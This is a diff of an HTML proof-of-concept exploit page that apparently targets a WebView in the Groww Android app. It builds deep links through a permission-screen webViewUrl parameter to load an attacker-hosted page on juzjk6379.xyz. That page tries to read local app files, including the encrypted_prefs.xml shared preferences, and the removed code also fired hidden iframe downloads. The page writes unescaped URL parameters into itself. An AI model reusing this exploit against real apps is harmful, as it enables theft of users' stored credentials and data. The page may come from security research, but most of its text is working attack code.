@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple Exploit Test</title>
+    <title>File Reader Test</title>
     <meta charset="UTF-8">
     <style>
         body {
@@ -10,22 +10,12 @@
             background-color: #000;
             color: #00ff00;
         }
-        .test {
+        .result {
             background-color: #111;
             border: 2px solid #ff0000;
             padding: 15px;
             margin: 15px 0;
             border-radius: 5px;
-        }
-        button {
-            background-color: #ff0000;
-            color: white;
-            padding: 15px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 10px;
-            font-size: 16px;
         }
         pre {
             background-color: #222;
@@ -33,124 +23,43 @@
             padding: 10px;
             border-radius: 3px;
             overflow-x: auto;
+            white-space: pre-wrap;
         }
     </style>
 </head>
 <body>
-    <h1>🔓 Simple Exploit Tests</h1>
-    
-    <div class="test">
-        <h2>Test 1: File Download</h2>
-        <p>Testing if downloadType=DOWNLOAD works</p>
-        <button onclick="testDownload()">🔽 Test Download</button>
-        <div id="downloadResult"></div>
-    </div>
-    
-    <div class="test">
-        <h2>Test 2: File Read</h2>
-        <p>Testing if isHtmlView + htmlFilePath works</p>
-        <button onclick="testFileRead()">📖 Test File Read</button>
-        <div id="fileResult"></div>
-    </div>
-    
-    <div class="test">
-        <h2>Current URL Info</h2>
-        <pre id="urlInfo"></pre>
-    </div>
+    <h1>🔓 File Reader Test</h1>
 
     <script>
-        // Show current URL and parameters
-        function showURLInfo() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const info = {
-                currentURL: window.location.href,
-                isHtmlView: urlParams.get('isHtmlView'),
-                htmlFilePath: urlParams.get('htmlFilePath'),
-                downloadType: urlParams.get('downloadType')
-            };
-            document.getElementById('urlInfo').textContent = JSON.stringify(info, null, 2);
-        }
+        // Check URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const isHtmlView = urlParams.get('isHtmlView');
+        const htmlFilePath = urlParams.get('htmlFilePath');
         
-        function testDownload() {
-            console.log("Testing download functionality...");
-            
-            // Try to trigger a download
-            const downloadURL = "https://juzjk6379.xyz/test-file.txt?downloadType=DOWNLOAD";
-            
-            // Method 1: iframe
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = downloadURL;
-            document.body.appendChild(iframe);
-            
-            // Method 2: window.location
-            setTimeout(() => {
-                window.location.href = downloadURL;
-            }, 2000);
-            
-            document.getElementById('downloadResult').innerHTML = 
-                `<p>✅ Triggered download test</p><p>URL: ${downloadURL}</p>`;
-        }
+        document.write(`<div class="result">`);
+        document.write(`<h2>📋 URL Analysis</h2>`);
+        document.write(`<p><strong>Current URL:</strong> ${window.location.href}</p>`);
+        document.write(`<p><strong>isHtmlView:</strong> ${isHtmlView}</p>`);
+        document.write(`<p><strong>htmlFilePath:</strong> ${htmlFilePath}</p>`);
+        document.write(`</div>`);
         
-        function testFileRead() {
-            console.log("Testing file read functionality...");
+        if (isHtmlView === 'true' && htmlFilePath) {
+            document.write(`<div class="result">`);
+            document.write(`<h2>🎯 FILE READ ATTEMPT</h2>`);
+            document.write(`<p>Attempting to read: <code>${htmlFilePath}</code></p>`);
+            document.write(`<p>If the file exists and is readable, its contents should appear below:</p>`);
+            document.write(`<hr>`);
+            document.write(`</div>`);
             
-            // Check if we're in HTML view mode
-            const urlParams = new URLSearchParams(window.location.search);
-            const isHtmlView = urlParams.get('isHtmlView');
-            const htmlFilePath = urlParams.get('htmlFilePath');
-            
-            if (isHtmlView === 'true' && htmlFilePath) {
-                document.getElementById('fileResult').innerHTML = 
-                    `<p>🎯 HTML View Mode Detected!</p>
-                     <p>Attempting to read: ${htmlFilePath}</p>
-                     <p>This would execute if file exists and is readable</p>`;
-            } else {
-                // Generate test URLs for file reading
-                const testFiles = [
-                    "/android_asset/cd-offer-details.json",
-                    "/data/data/in.groww.dash/shared_prefs/encrypted_prefs.xml"
-                ];
-                
-                let testURLs = testFiles.map(file => {
-                    const encodedFile = encodeURIComponent(file);
-                    return `https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/simple_test.html?isHtmlView=true%26htmlFilePath=${encodedFile}`;
-                });
-                
-                document.getElementById('fileResult').innerHTML = 
-                    `<p>📋 Test URLs generated:</p>
-                     <p style="font-size:12px; word-break:break-all;">${testURLs.join('<br><br>')}</p>`;
-            }
+            // The webview should load the file content here if htmlFilePath works
+            console.log(`Attempting to read file: ${htmlFilePath}`);
+        } else {
+            document.write(`<div class="result">`);
+            document.write(`<h2>❌ No File Read Parameters</h2>`);
+            document.write(`<p>To test file reading, use this URL format:</p>`);
+            document.write(`<pre>https://credit.groww.in/pl/permission-screen?webViewUrl=https://juzjk6379.xyz/file_reader.html?isHtmlView=true%26htmlFilePath=[ENCODED_FILE_PATH]</pre>`);
+            document.write(`</div>`);
         }
-        
-        // Auto-run when page loads
-        window.addEventListener('load', function() {
-            showURLInfo();
-            
-            // Auto-test if we have parameters
-            const urlParams = new URLSearchParams(window.location.search);
-            
-            if (urlParams.get('downloadType') === 'DOWNLOAD') {
-                console.log("🔽 Download mode detected!");
-                document.body.innerHTML = `
-                    <h1>🔽 DOWNLOAD TEST ACTIVE</h1>
-                    <p>If you see this, the download trigger worked!</p>
-                    <p>Current URL: ${window.location.href}</p>
-                `;
-            }
-            
-            if (urlParams.get('isHtmlView') === 'true') {
-                console.log("📖 HTML View mode detected!");
-                const filePath = urlParams.get('htmlFilePath');
-                document.body.innerHTML = `
-                    <h1>📖 FILE READ TEST ACTIVE</h1>
-                    <p>HTML View Mode: ${urlParams.get('isHtmlView')}</p>
-                    <p>File Path: ${filePath}</p>
-                    <p>If you see this, the file read mechanism is working!</p>
-                    <p>The actual file content would be loaded here if accessible.</p>
-                `;
-            }
-        });
     </script>
 </body>
 </html>
